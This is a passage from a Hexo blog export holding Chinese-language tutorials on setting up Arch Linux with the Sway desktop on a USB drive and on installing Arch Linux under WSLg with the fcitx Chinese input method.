也似乎能用了，所以直接装 archlinux+sway。</p>\n<p>没错，我天天折腾没用的东西。</p>\n<span id=\"more\"></span>\n\n<h1 id=\"安装系统\"><a href=\"#安装系统\" class=\"headerlink\" title=\"安装系统\"></a>安装系统</h1><p>没什么好说的，网上教程很多，照着教程一步步配置就好，但是我想装的是 linuxToGo，所以 grub 引导写入的命令要加上 <code>--removable</code> 选项，我也是装了好几次最后都不能在 U 盘启动才知道这个问题。</p>\n<h1 id=\"安装-SwayWM\"><a href=\"#安装-SwayWM\" class=\"headerlink\" title=\"安装 SwayWM\"></a>安装 SwayWM</h1><p>安装 sway 桌面</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo pacman -S wlroots sway</span><br></pre></td></tr></table></figure>\n\n<p>配置文件设置</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cp</span> /etc/sway/config ~/.config/sway/</span><br><span class=\"line\"></span><br><span class=\"line\">vim ~/.config/sway/config</span><br></pre></td></tr></table></figure>\n\n<p>使用 vulkan 做渲染后端</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim ~/.pam_environment</span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\">WLR_RENDERER=vulkan</span><br></pre></td></tr></table></figure>\n\n<p>登录 tty1 自动进入 sway</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim ~/.bash_profile</span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\">[[ -f ~/.bashrc ]] &amp;&amp; . ~/.bashrc</span><br><span class=\"line\">[ <span class=\"string\">&quot;<span class=\"subst\">$(tty)</span>&quot;</span> = <span class=\"string\">&quot;/dev/tty1&quot;</span> ] &amp;&amp; <span class=\"built_in\">exec</span> sway</span><br></pre></td></tr></table></figure>\n\n<p>wofi 启动器和 alacritty 终端</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo pacman -S wofi alacritty</span><br></pre></td></tr></table></figure>\n\n<p>waybar 状态栏</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo pacman -S waybar otf-font-awesome</span><br><span class=\"line\"></span><br><span class=\"line\">vim ~/.config/sway/config</span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#bar &#123;</span></span><br><span class=\"line\"><span class=\"comment\">#    position top</span></span><br><span class=\"line\"><span class=\"comment\">#    swaybar_command waybar</span></span><br><span class=\"line\"><span class=\"comment\">#&#125;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"fcitx5-输入法\"><a href=\"#fcitx5-输入法\" class=\"headerlink\" title=\"fcitx5 输入法\"></a>fcitx5 输入法</h1><p>安装</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo pacman -S fcitx5 fcitx5-chinese-addons fcitx5-pinyin-moegirl</span><br></pre></td></tr></table></figure>\n\n<p>配置</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim ~/.config/sway/config</span><br><span class=\"line\"><span class=\"comment\">### Auto start</span></span><br><span class=\"line\"><span class=\"built_in\">exec</span> --no-startup-id fcitx5 -d</span><br><span class=\"line\"></span><br><span class=\"line\">vim ~/.pam_environment</span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\">GTK_IM_MODULE DEFAULT=fcitx</span><br><span class=\"line\">QT_IM_MODULE  DEFAULT=fcitx</span><br><span class=\"line\">XMODIFIERS    DEFAULT=@im=fcitx</span><br><span class=\"line\">INPUT_METHOD  DEFAULT=fcitx</span><br><span class=\"line\">SDL_IM_MODULE DEFAULT=fcitx</span><br></pre></td></tr></table></figure>\n\n<p>wps 的中文输入</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo vim /usr/bin/wps</span><br><span class=\"line\"><span class=\"comment\"># 添加如下两行</span></span><br><span class=\"line\"><span class=\"comment\">#!/bin/bash</span></span><br><span class=\"line\"><span class=\"built_in\">export</span> XMODIFIERS=<span class=\"string\">&quot;@im=fcitx&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">export</span> QT_IM_MODULE=<span class=\"string\">&quot;fcitx&quot;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h1><p><strong>特别感谢各位大佬的分享记录</strong>，让我能尝试这些新技术新玩意。</p>\n<ul>\n<li><a href=\"https://github.com/CelestialCosmic/themeblog/issues/22\">Archlinux+Sway+Windows11 完全配置记录</a></li>\n<li><a href=\"https://www.gnu.org/software/grub/manual/grub/html_node/Installing-GRUB-using-grub_002dinstall.html#:~:text=For%20removable%20installs%20you%20have%20to%20use%20--removable,and%20--efi-directory%20%3A%20%23%20grub-install%20--efi-directory%3D%2Fmnt%2Fusb%20--boot-directory%3D%2Fmnt%2Fusb%2Fboot%20--removable\">4.1 Installing GRUB using grub-install</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/462322143\">探索 linux 桌面全面 wayland 化（基于 swaywm）</a></li>\n<li><a href=\"https://blog.csdn.net/HideOnLie/article/details/107615277\">ArchLinux 安装 fcitx5 以及拼音输入法</a></li>\n<li><a href=\"https://blog.csdn.net/wishchin/article/details/89674250\">Linux：WPS 不能使用中文输入法</a></li>\n</ul>\n","site":{"data":{}},"excerpt":"<p>我的 ManjaroToGo 在一次更新后 grub 可能是坏了，找不到启动盘，使用镜像 chroot 尝试修复了好几次都不行，重装切换成 archlinux 算了，再一想，没尝试过平铺式桌面，而且现在的 wayland 也似乎能用了，所以直接装 archlinux+sway。</p>\n<p>没错，我天天折腾没用的东西。</p>","more":"<h1 id=\"安装系统\"><a href=\"#安装系统\" class=\"headerlink\" title=\"安装系统\"></a>安装系统</h1><p>没什么好说的，网上教程很多，照着教程一步步配置就好，但是我想装的是 linuxToGo，所以 grub 引导写入的命令要加上 <code>--removable</code> 选项，我也是装了好几次最后都不能在 U 盘启动才知道这个问题。</p>\n<h1 id=\"安装-SwayWM\"><a href=\"#安装-SwayWM\" class=\"headerlink\" title=\"安装 SwayWM\"></a>安装 SwayWM</h1><p>安装 sway 桌面</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo pacman -S wlroots sway</span><br></pre></td></tr></table></figure>\n\n<p>配置文件设置</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cp</span> /etc/sway/config ~/.config/sway/</span><br><span class=\"line\"></span><br><span class=\"line\">vim ~/.config/sway/config</span><br></pre></td></tr></table></figure>\n\n<p>使用 vulkan 做渲染后端</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim ~/.pam_environment</span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\">WLR_RENDERER=vulkan</span><br></pre></td></tr></table></figure>\n\n<p>登录 tty1 自动进入 sway</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim ~/.bash_profile</span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\">[[ -f ~/.bashrc ]] &amp;&amp; . ~/.bashrc</span><br><span class=\"line\">[ <span class=\"string\">&quot;<span class=\"subst\">$(tty)</span>&quot;</span> = <span class=\"string\">&quot;/dev/tty1&quot;</span> ] &amp;&amp; <span class=\"built_in\">exec</span> sway</span><br></pre></td></tr></table></figure>\n\n<p>wofi 启动器和 alacritty 终端</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo pacman -S wofi alacritty</span><br></pre></td></tr></table></figure>\n\n<p>waybar 状态栏</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo pacman -S waybar otf-font-awesome</span><br><span class=\"line\"></span><br><span class=\"line\">vim ~/.config/sway/config</span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#bar &#123;</span></span><br><span class=\"line\"><span class=\"comment\">#    position top</span></span><br><span class=\"line\"><span class=\"comment\">#    swaybar_command waybar</span></span><br><span class=\"line\"><span class=\"comment\">#&#125;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"fcitx5-输入法\"><a href=\"#fcitx5-输入法\" class=\"headerlink\" title=\"fcitx5 输入法\"></a>fcitx5 输入法</h1><p>安装</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo pacman -S fcitx5 fcitx5-chinese-addons fcitx5-pinyin-moegirl</span><br></pre></td></tr></table></figure>\n\n<p>配置</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim ~/.config/sway/config</span><br><span class=\"line\"><span class=\"comment\">### Auto start</span></span><br><span class=\"line\"><span class=\"built_in\">exec</span> --no-startup-id fcitx5 -d</span><br><span class=\"line\"></span><br><span class=\"line\">vim ~/.pam_environment</span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\">GTK_IM_MODULE DEFAULT=fcitx</span><br><span class=\"line\">QT_IM_MODULE  DEFAULT=fcitx</span><br><span class=\"line\">XMODIFIERS    DEFAULT=@im=fcitx</span><br><span class=\"line\">INPUT_METHOD  DEFAULT=fcitx</span><br><span class=\"line\">SDL_IM_MODULE DEFAULT=fcitx</span><br></pre></td></tr></table></figure>\n\n<p>wps 的中文输入</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo vim /usr/bin/wps</span><br><span class=\"line\"><span class=\"comment\"># 添加如下两行</span></span><br><span class=\"line\"><span class=\"comment\">#!/bin/bash</span></span><br><span class=\"line\"><span class=\"built_in\">export</span> XMODIFIERS=<span class=\"string\">&quot;@im=fcitx&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">export</span> QT_IM_MODULE=<span class=\"string\">&quot;fcitx&quot;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h1><p><strong>特别感谢各位大佬的分享记录</strong>，让我能尝试这些新技术新玩意。</p>\n<ul>\n<li><a href=\"https://github.com/CelestialCosmic/themeblog/issues/22\">Archlinux+Sway+Windows11 完全配置记录</a></li>\n<li><a href=\"https://www.gnu.org/software/grub/manual/grub/html_node/Installing-GRUB-using-grub_002dinstall.html#:~:text=For%20removable%20installs%20you%20have%20to%20use%20--removable,and%20--efi-directory%20%3A%20%23%20grub-install%20--efi-directory%3D%2Fmnt%2Fusb%20--boot-directory%3D%2Fmnt%2Fusb%2Fboot%20--removable\">4.1 Installing GRUB using grub-install</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/462322143\">探索 linux 桌面全面 wayland 化（基于 swaywm）</a></li>\n<li><a href=\"https://blog.csdn.net/HideOnLie/article/details/107615277\">ArchLinux 安装 fcitx5 以及拼音输入法</a></li>\n<li><a href=\"https://blog.csdn.net/wishchin/article/details/89674250\">Linux：WPS 不能使用中文输入法</a></li>\n</ul>"},{"title":"ArchLinux on WSLg","date":"2021-10-16T12:45:56.000Z","_content":"\n经过多次尝试，我终于成功在 WSLg(Windows Subsystem for Linux GUI) 上成功安装了 ArchLinux 并配置了中文输入法，真是令人唏嘘，特别是卡在配置中文输入法上一两个星期真是令人感到非常气馁。\n\n所幸我终于成功了，本文就是在 ArchLinux on WSLg 上编写的，现在既可以愉快地玩游戏又可以码代码同时不用在 Windows 上配置恶心的环境了（没错，我再也不想体验在 windows 上配置环境变量等等繁琐的东西了）。\n\n<!--more-->\n\n# 准备\n\n首先要做的准备就是启用 WSLg 了。由于我装的系统是 Windows11，所以对于版本什么的倒是不用担心，但是要注意 **WSLg 的 Windows 操作系统版本要求是 21362+**，可以使用 win+r 输入 winver 查看版本。\n\n## 启用 wsl\n\n用管理员打开 powershell 输入\n\n```powershell\ndism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart\n```\n\n## 启用虚拟平台\n\n用管理员打开 powershell 输入\n\n```powershell\ndism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart\n```\n\n## 将 WSL2 设置为默认版本\n\n（不知道为什么我设置了安装的系统还是 WSL1）用管理员打开 powershell 输入\n\n```powershell\nwsl --set-default-version 2\n```\n\n## 更新到 WSLg\n\n```powershell\nwsl --update\n```\n\n## 安装 LxRunOffline\n\n这是个很好用的 wsl 管理工具，可以用来安装没有微软官方支持的 wsl 子系统，比如我现在安装的 ArchLinux。\n\n如果你配置了 Windows 的包管理器比如 Scoop ，那就简单了，一条命令搞定\n\n```powershell\nscoop install lxrunoffline\n```\n\n不然就手工下安装包吧，下载地址：https://github.com/DDoSolitary/LxRunOffline/releases\n\n选择最新版下载，解压后将 LxRunOffline.exe 放入任意一个 path 文件夹下（比如 C:/Windows/System32）\n\n## 下载 ArchLinux\n\n下载地址：https://mirrors.tuna.tsinghua.edu.cn/archlinux/iso/latest/\n\n不管选择什么版本，记得需要的格式是 `tar.gz` 文件。\n\n准备工作完成，下面开始正式安装.\n\n# 安装 ArchLinux 到 WSLg\n\n## 安装镜像\n\n```powershell\nLxRunOffline i -n <自定义名称> -f <Arch镜像位置> -d <安装系统的位置> -r root.x86_64\n```\n\n## 设置为 WSL2\n\n```powershell\nwsl --set-version <名称> 2\n```\n\n## 进入系统\n\n```powershell\nwsl -d <名字>\n```\n\n如果你只安装了一个子系统，那么只输入 `wsl` 会自动进入默认的子系统中。\n\nPS：WSL 一般的管理命令\n\n查看安装的子系统和对应版本\n\n```powershell\nwsl -l -v\n```\n\n关闭某个子系统\n\n```powershell\nwsl --shutdown <名字>\n```\n\n## 以下操作在子系统中进行\n\n编辑镜像源\n\n```bash\ncd /etc/\n```\n\n用 windows 的文件管理器打开/etc 目录：\n\n```bash\nexplorer.exe .\n```\n\n编辑 /etc/pacman.conf 文件，在最后加入：\n\n```bash\n[archlinuxcn]\nServer = https://mirrors.tuna.tsinghua.edu.cn/archlinuxcn/$arch\n```\n\n编辑 /etc/pacman.d/mirrolist 文件，选择一些 China 的源，将源注释去掉（选择部分即可），譬如我选择的是清华源：\n\n```bash\n#Server = http://mirrors.tuna.tsinghua.edu.cn/archlinux/$repo/os/$arch\nServer = https://mirrors.tuna.tsinghua.edu.cn/archlinux/$repo/os/$arch\n```\n\n更新系统，依次执行以下命令：\n\n```bash\n# 更新\npacman -Syy\n\npacman-key --init\n\npacman-key --populate\n\n# 添加 archlinuxcn 的keyring\npacman -S archlinuxcn-keyring\n\n# 安装 sudo vim yay 等软件\npacman -S base base-devel vim git yay\n```\n\n给 root 用户添加密码：\n\n```bash\npasswd\n```\n\n添加一个普通用户并设置密码：\n\n```bash\nuseradd -m -g wheel <用户名>\n\npasswd\n```\n\n编辑文件 /etc/sudoers ，去掉 %wheel ALL=(ALL) ALL 的注释\n\n```bash\nvim /etc/sudoers\n```\n\n查看普通用户 id：\n\n```bash\nid -u <用户名>\n```\n\n## 设置进入子系统时使用普通用户\n\n在 powershell 中执行：\n\n```powershell\nlxrunoffline su -n <子系统名字> -v <账户id>\n```\n\n这样初步的设置就完成了。\n\n# 安装中文支持和中文输入法\n\n## 中文支持\n\n1. 安装中文 Locale\n\n修改/etc/locale.gen 文件，取消对应项之前的注释符\n\n```bash\nsudo vim /etc/locale.gen\n```\n\n我目前只启用了两个\n\n```bash\nen_US.UTF-8 UTF-8\nzh_CN.GBK GBK\n```\n\n2. 启用中文 locale\n\n```bash\nsudo locale-gen\n```\n\n3. 安装中文字体\n\n```bash\nsudo pacman -S wqy-zenhei\n```\n\n## 中文输入法\n\n就是这一步卡了我好久，试过 ibus，fcitx， fcitx5，开始时怎么都调用不了输入法，最后还是选择了 fcitx，不过要额外下载一个 dbus-x11。\n\n1. 必要软件和输入法，我本人使用 Rime，可换成其他的\n\n```bash\nsudo pacman -S fcitx fcitx-configtool fcitx-rime\n```\n\n2. 切换到 root 用户生成 dbus 机器码\n\n```bash\ndbus-uuidgen > /var/lib/dbus/machine-id\n```\n\n3. 安装 dbus-x11\n\n```bash\nyay dbus-x11\n```\n\n4. 配置输入环境\n\n将以下内容添加到 ~/.bashrc 配置文件中\n\n```bash\nexport GTK_IM_MODULE=fcitx\nexport QT_IM_MODULE=fcitx\nexport XMODIFIERS=@im=fcitx\nexport DefaultIMModule=fcitx\n# fcitx 自启\nfcitx-autostart &>/dev/null\n```\n\n```bash\nvim ~/.bashrc\n\nsource ~/.bashrc\n```\n\nbash 输入 fcitx-configtool ，配置输入法。\n\n然后就可以在 gui 程序中使用中文输入法啦。\n\n# 参考文章\n\n- [在 WSL2 中安装 ArchLinux](https://www.cnblogs.com/kainhuck/p/13835833.html)\n- [Arch 支持中文字体以及安装中文输入法](http://ocdman.github.io/2017/11/22/Arch%E6%94%AF%E6%8C%81%E4%B8%AD%E6%96%87%E5%AD%97%E4%BD%93%E4%BB%A5%E5%8F%8A%E5%AE%89%E8%A3%85%E4%B8%AD%E6%96%87%E8%BE%93%E5%85%A5%E6%B3%95/)\n- [WSL2-不输 Mac 的开发体验（一）：WSL2 的安装及基本配置](https://zhuanlan.zhihu.com/p/407555801)\n- [archlinux 中 fcitx 安装配置与常见问题](https://blog.csdn.net/sinat_33528967/article/details/97611020archlinux中fcitx安装配置与常见问题)\n","source":"_posts/2021/10/ArchLinux-on-WSLg.md","raw":"---\ntitle: ArchLinux on WSLg\ndate: 2021-10-16 20:45:56\ntags:\n  - 配置\n  - WSL\ncategories:\n  - 配置\n  - WSL\n---\n\n经过多次尝试，我终于成功在 WSLg(Windows Subsystem for Linux GUI) 上成功安装了 ArchLinux 并配置了中文输入法，真是令人唏嘘，特别是卡在配置中文输入法上一两个星期真是令人感到非常气馁。\n\n所幸我终于成功了，本文就是在 ArchLinux on WSLg 上编写的，现在既可以愉快地玩游戏又可以码代码同时不用在 Windows 上配置恶心的环境了（没错，我再也不想体验在 windows 上配置环境变量等等繁琐的东西了）。\n\n<!--more-->\n\n# 准备\n\n首先要做的准备就是启用 WSLg 了。由于我装的系统是 Windows11，所以对于版本什么的倒是不用担心，但是要注意 **WSLg 的 Windows 操作系统版本要求是 21362+**，可以使用 win+r 输入 winver 查看版本。\n\n## 启用 wsl\n\n用管理员打开 powershell 输入\n\n```powershell\ndism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart\n```\n\n## 启用虚拟平台\n\n用管理员打开 powershell 输入\n\n```powershell\ndism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart\n```\n\n## 将 WSL2 设置为默认版本\n\n（不知道为什么我设置了安装的系统还是 WSL1）用管理员打开 powershell 输入\n\n```powershell\nwsl --set-default-version 2\n```\n\n## 更新到 WSLg\n\n```powershell\nwsl --update\n```\n\n## 安装 LxRunOffline\n\n这是个很好用的 wsl 管理工具，可以用来安装没有微软官方支持的 wsl 子系统，比如我现在安装的 ArchLinux。\n\n如果你配置了 Windows 的包管理器比如 Scoop ，那就简单了，一条命令搞定\n\n```powershell\nscoop install lxrunoffline\n```\n\n不然就手工下安装包吧，下载地址：https://github.com/DDoSolitary/LxRunOffline/releases\n\n选择最新版下载，解压后将 LxRunOffline.exe 放入任意一个 path 文件夹下（比如 C:/Windows/System32）\n\n## 下载 ArchLinux\n\n下载地址：https://mirrors.tuna.tsinghua.edu.cn/archlinux/iso/latest/\n\n不管选择什么版本，记得需要的格式是 `tar.gz` 文件。\n\n准备工作完成，下面开始正式安装.\n\n# 安装 ArchLinux 到 WSLg\n\n## 安装镜像\n\n```powershell\nLxRunOffline i -n <自定义名称> -f <Arch镜像位置> -d <安装系统的位置> -r root.x86_64\n```\n\n## 设置为 WSL2\n\n```powershell\nwsl --set-version <名称> 2\n```\n\n## 进入系统\n\n```powershell\nwsl -d <名字>\n```\n\n如果你只安装了一个子系统，那么只输入 `wsl` 会自动进入默认的子系统中。\n\nPS：WSL 一般的管理命令\n\n查看安装的子系统和对应版本\n\n```powershell\nwsl -l -v\n```\n\n关闭某个子系统\n\n```powershell\nwsl --shutdown <名字>\n```\n\n## 以下操作在子系统中进行\n\n编辑镜像源\n\n```bash\ncd /etc/\n```\n\n用 windows 的文件管理器打开/etc 目录：\n\n```bash\nexplorer.exe .\n```\n\n编辑 /etc/pacman.conf 文件，在最后加入：\n\n```bash\n[archlinuxcn]\nServer = https://mirrors.tuna.tsinghua.edu.cn/archlinuxcn/$arch\n```\n\n编辑 /etc/pacman.d/mirrolist 文件，选择一些 China 的源，将源注释去掉（选择部分即可），譬如我选择的是清华源：\n\n```bash\n#Server = http://mirrors.tuna.tsinghua.edu.cn/archlinux/$repo/os/$arch\nServer = https://mirrors.tuna.tsinghua.edu.cn/archlinux/$repo/os/$arch\n```\n\n更新系统，依次执行以下命令：\n\n```bash\n# 更新\npacman -Syy\n\npacman-key --init\n\npacman-key --populate\n\n# 添加 archlinuxcn 的keyring\npacman -S archlinuxcn-keyring\n\n# 安装 sudo vim yay 等软件\npacman -S base base-devel vim git yay\n```\n\n给 root 用户添加密码：\n\n```bash\npasswd\n```\n\n添加一个普通用户并设置密码：\n\n```bash\nuseradd -m -g wheel <用户名>\n\npasswd\n```\n\n编辑文件 /etc/sudoers ，去掉 %wheel ALL=(ALL) ALL 的注释\n\n```bash\nvim /etc/sudoers\n```\n\n查看普通用户 id：\n\n```bash\nid -u <用户名>\n```\n\n## 设置进入子系统时使用普通用户\n\n在 powershell 中执行：\n\n```powershell\nlxrunoffline su -n <子系统名字> -v <账户id>\n```\n\n这样初步的设置就完成了。\n\n# 安装中文支持和中文输入法\n\n## 中文支持\n\n1. 安装中文 Locale\n\n修改/etc/locale.gen 文件，取消对应项之前的注释符\n\n```bash\nsudo vim /etc/locale.gen\n```\n\n我目前只启用了两个\n\n```bash\nen_US.UTF-8 UTF-8\nzh_CN.GBK GBK\n```\n\n2. 启用中文 locale\n\n```bash\nsudo locale-gen\n```\n\n3. 安装中文字体\n\n```bash\nsudo pacman -S wqy-zenhei\n```\n\n## 中文输入法\n\n就是这一步卡了我好久，试过 ibus，fcitx， fcitx5，开始时怎么都调用不了输入法，最后还是选择了 fcitx，不过要额外下载一个 dbus-x11。\n\n1. 必要软件和输入法，我本人使用 Rime，可换成其他的\n\n```bash\nsudo pacman -S fcitx fcitx-configtool fcitx-rime\n```\n\n2. 切换到 root 用户生成 dbus 机器码\n\n```bash\ndbus-uuidgen > /var/lib/dbus/machine-id\n```\n\n3. 安装 dbus-x11\n\n```bash\nyay dbus-x11\n```\n\n4. 配置输入环境\n\n将以下内容添加到 ~/.bashrc 配置文件中\n\n```bash\nexport GTK_IM_MODULE=fcitx\nexport QT_IM_MODULE=fcitx\nexport XMODIFIERS=@im=fcitx\nexport DefaultIMModule=fcitx\n# fcitx 自启\nfcitx-autostart &>/dev/null\n```\n\n```bash\nvim ~/.bashrc\n\nsource ~/.bashrc\n```\n\nbash 输入 fcitx-configtool ，配置输入法。\n\n然后就可以在 gui 程序中使用中文输入法啦。\n\n# 参考文章\n\n- [在 WSL2 中安装 ArchLinux](https://www.cnblogs.com/kainhuck/p/13835833.html)\n- [Arch 支持中文字体以及安装中文输入法](http://ocdman.github.io/2017/11/22/Arch%E6%94%AF%E6%8C%81%E4%B8%AD%E6%96%87%E5%AD%97%E4%BD%93%E4%BB%A5%E5%8F%8A%E5%AE%89%E8%A3%85%E4%B8%AD%E6%96%87%E8%BE%93%E5%85%A5%E6%B3%95/)\n- [WSL2-不输 Mac 的开发体验（一）：WSL2 的安装及基本配置](https://zhuanlan.zhihu.com/p/407555801)\n- [archlinux 中 fcitx 安装配置与常见问题](https://blog.csdn.net/sinat_33528967/article/details/97611020archlinux中fcitx安装配置与常见问题)\n","slug":"2021/10/ArchLinux-on-WSLg","published":1,"updated":"2022-09-26T15:03:05.164Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clyh3xcj0000nzge33npghkjj","content":"<p>经过多次尝试，我终于成功在 WSLg(Windows Subsystem for Linux GUI) 上成功安装了 ArchLinux 并配置了中文输入法，真是令人唏嘘，特别是卡在配置中文输入法上一两个星期真是令人感到非常气馁。</p>\n<p>所幸我终于成功了，本文就是在 ArchLinux on WSLg 上编写的，现在既可以愉快地玩游戏又可以码代码同时不用在 Windows 上配置恶心的环境了（没错，我再也不想体验在 windows 上配置环境变量等等繁琐的东西了）。</p>\n<span id=\"more\"></span>\n\n<h1 id=\"准备\"><a href=\"#准备\" class=\"headerlink\" title=\"准备\"></a>准备</h1><p>首先要做的准备就是启用 WSLg 了。由于我装的系统是 Windows11，所以对于版本什么的倒是不用担心，但是要注意 **WSLg 的 Windows 操作系统版本要求是 21362+**，可以使用 win+r 输入 winver 查看版本。</p>\n<h2 id=\"启用-wsl\"><a href=\"#启用-wsl\" class=\"headerlink\" title=\"启用 wsl\"></a>启用 wsl</h2><p>用管理员打开 powershell 输入</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dism.exe /online /<span class=\"built_in\">enable-feature</span> /featurename:Microsoft<span class=\"literal\">-Windows-Subsystem-Linux</span> /all /norestart</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"启用虚拟平台\"><a href=\"#启用虚拟平台\" class=\"headerlink\" title=\"启用虚拟平台\"></a>启用虚拟平台</h2><p>用管理员打开 powershell 输入</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dism.exe /online /<span class=\"built_in\">enable-feature</span> /featurename:VirtualMachinePlatform /all /norestart</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"将-WSL2-设置为默认版本\"><a href=\"#将-WSL2-设置为默认版本\" class=\"headerlink\" title=\"将 WSL2 设置为默认版本\"></a>将 WSL2 设置为默认版本</h2><p>（不知道为什么我设置了安装的系统还是 WSL1）用管理员打开 powershell 输入</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wsl <span class=\"literal\">--set-default-version</span> <span class=\"number\">2</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"更新到-WSLg\"><a href=\"#更新到-WSLg\" class=\"headerlink\" title=\"更新到 WSLg\"></a>更新到 WSLg</h2><figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wsl <span class=\"literal\">--update</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"安装-LxRunOffline\"><a href=\"#安装-LxRunOffline\" class=\"headerlink\" title=\"安装 LxRunOffline\"></a>安装 LxRunOffline</h2><p>这是个很好用的 wsl 管理工具，可以用来安装没有微软官方支持的 